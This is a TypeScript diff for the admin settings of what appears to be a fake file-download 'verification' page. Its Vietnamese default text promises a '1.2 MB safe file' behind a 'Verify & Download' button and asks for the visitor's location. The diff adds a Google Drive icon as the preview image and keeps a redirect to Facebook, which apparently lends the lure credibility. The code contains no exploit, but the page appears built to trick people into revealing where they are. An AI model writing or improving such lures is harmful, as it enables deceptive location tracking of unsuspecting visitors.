@@ -15,6 +15,7 @@ export interface VerificationConfig {
   buttonText: string;
   footerText: string;
   redirectUrl: string;
+  previewImageUrl: string;
 }
 
 const defaultConfig: VerificationConfig = {
@@ -24,13 +25,16 @@ const defaultConfig: VerificationConfig = {
     fileInfo: "1.2 MB - Tệp an toàn",
     buttonText: "Xác minh & Tải xuống",
     footerText: "Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.",
-    redirectUrl: "https://www.facebook.com"
+    redirectUrl: "https://www.facebook.com",
+    previewImageUrl: "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg",
 };
 
 export async function getVerificationConfigAction(): Promise<VerificationConfig> {
   try {
     const content = await fs.readFile(configPath, 'utf-8');
-    return JSON.parse(content);
+    const parsed = JSON.parse(content);
+    // Merge with default to ensure new fields are present if config is old
+    return { ...defaultConfig, ...parsed };
   } catch (error) {
     try {
       if (!fs.existsSync(configDir)){
@@ -48,8 +52,9 @@ export async function getVerificationConfigAction(): Promise<VerificationConfig>
 export async function updateVerificationConfigAction(newConfig: VerificationConfig) {
   try {
     await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2), 'utf-8');
-    // Revalidate the home page to reflect changes instantly
+    // Revalidate the home page and root layout to reflect changes instantly
     revalidatePath('/');
+    revalidatePath('.', 'layout');
     return { success: true, message: 'Settings updated successfully.' };
   } catch (error) {
     const message = error instanceof Error ? error.message : 'An unknown error occurred';
